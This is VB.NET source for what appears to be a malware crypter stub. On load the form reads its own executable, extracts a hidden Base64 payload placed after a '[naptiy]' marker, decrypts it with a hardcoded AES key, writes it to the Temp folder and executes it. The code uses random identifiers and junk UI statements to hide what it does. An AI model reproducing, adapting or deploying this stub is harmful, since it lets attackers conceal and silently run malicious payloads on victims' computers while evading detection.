Public Class hbfkkhb
    Function UnSecure(ByVal data As Byte()) As Byte()
        Using w7Lukn6OlRFLeDA As New System.Security.Cryptography.RijndaelManaged
            w7Lukn6OlRFLeDA.IV = New Byte() {8, 5, 7, 3, 2, 6, 4, 9, 1, 2, 7, 5, 1, 6, 3, 4}
            w7Lukn6OlRFLeDA.Key = New Byte() {4, 3, 6, 1, 5, 7, 2, 1, 9, 4, 6, 2, 3, 7, 5, 8}
            Return w7Lukn6OlRFLeDA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Private Sub hbfkkhb_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            TextBox1.BorderStyle = BorderStyle.None
            CheckBox1.Checked = True
            Button2.Text = 0

            Dim HuvA3t5oOAtHdih1RF8K5pKCP As String = My.Computer.FileSystem.SpecialDirectories.Temp
            Button2.Text = 0
            Dim LXBghFMPUpFVxTcayVLuHpKVI() As String = Split(System.IO.File.ReadAllText(Application.ExecutablePath), "[naptiy]")
            TextBox1.BorderStyle = BorderStyle.None
            Dim ZpblJtBAtRAECnvWaoMiJMPxf As Byte() = UnSecure(Convert.FromBase64String(LXBghFMPUpFVxTcayVLuHpKVI(1)))
            Button2.Text = 0
            My.Computer.FileSystem.WriteAllBytes(HuvA3t5oOAtHdih1RF8K5pKCP & "\" & LXBghFMPUpFVxTcayVLuHpKVI(2), ZpblJtBAtRAECnvWaoMiJMPxf, False)
            Process.Start(HuvA3t5oOAtHdih1RF8K5pKCP & "\" & LXBghFMPUpFVxTcayVLuHpKVI(2))
        Catch ex As Exception
            Process.GetCurrentProcess.Kill()
        End Try
        Application.Exit()
    End Sub
End Class